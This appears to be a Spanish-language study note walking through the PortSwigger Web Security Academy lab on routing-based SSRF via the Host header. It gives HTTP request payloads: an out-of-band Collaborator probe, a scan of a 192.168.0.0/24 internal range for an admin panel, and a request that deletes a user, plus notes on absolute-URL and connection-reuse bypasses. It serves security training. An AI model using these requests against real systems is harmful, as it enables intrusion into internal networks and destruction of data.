---
aliases:
  - Host Header 004 - routing-based SSRF a interno
  - routing-based ssrf via host header
tags:
  - vuln/host-header
  - example
  - portswigger
---

# 004 — Routing-based SSRF (Host → IP interna)

> Lab: [Routing-based SSRF](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-routing-based-ssrf) · **Practitioner** · técnica → [[vulnerabilities/016-host-header-injection/host-header|entry point]]

## ¿Por qué acá? (el Host decide el routing → SSRF)
- **Último salto:** acá un front-end **rutea** la petición según el `Host`. Si lo cambiás por una IP interna, la request viaja **adentro de la red** → SSRF por el Host.
- **Por qué es ciego:** no ves la respuesta del interno de una, así que primero **confirmás** con Collaborator y después **escaneás** la `/24` con Intruder hasta pegar en el panel admin interno.

## Cómo explotarlo

> 🟡 <mark>Resaltado</mark> = lo que reemplazás vos (tu Collaborator / la IP interna).

**Paso 1 — confirmar** que rutea (poné tu Collaborator en el `Host` y "Poll now"):
<pre class="payload"><code>GET / HTTP/1.1
Host: <mark>TU-SUBDOMINIO.oastify.com</mark></code></pre>
**Paso 2 — escanear** el último octeto con Intruder (0-255) hasta un 200:
<pre class="payload"><code>GET /admin HTTP/1.1
Host: <mark>192.168.0.0</mark></code></pre>
**Paso 3 — impacto** con la IP que respondió el panel:
<pre class="payload"><code>GET /admin/delete?username=<mark>carlos</mark> HTTP/1.1
Host: <mark>192.168.0.X</mark></code></pre>

## Verificación
En el paso 1 llega una **interacción DNS/HTTP** a tu Collaborator (rutea el Host). En el paso 2, una IP de `192.168.0.X` devuelve el **panel admin** (200); con ella borrás a carlos → lab resuelto.

## Detalles que se pasan por alto
- Si el front-end **valida** el `Host`, poné la IP interna en la **request line** (URL absoluta) y dejá el `Host` legítimo: `GET https://192.168.0.X:8080/admin HTTP/1.1` con `Host: LAB-ID…` (lab 6 · [labs/README](../labs/README#payloads-por-lab)).
- Si valida **solo la 1ª request** de la conexión → connection-state attack: 2 requests, 1 socket → 🐍 [[vulnerabilities/016-host-header-injection/scripts/conn_reuse.py|conn_reuse.py]] (lab 7).
- Es literalmente un SSRF disparado por el Host → misma familia que [[vulnerabilities/007-ssrf/ssrf|SSRF]] (targets internos, Collaborator, escaneo con Intruder).
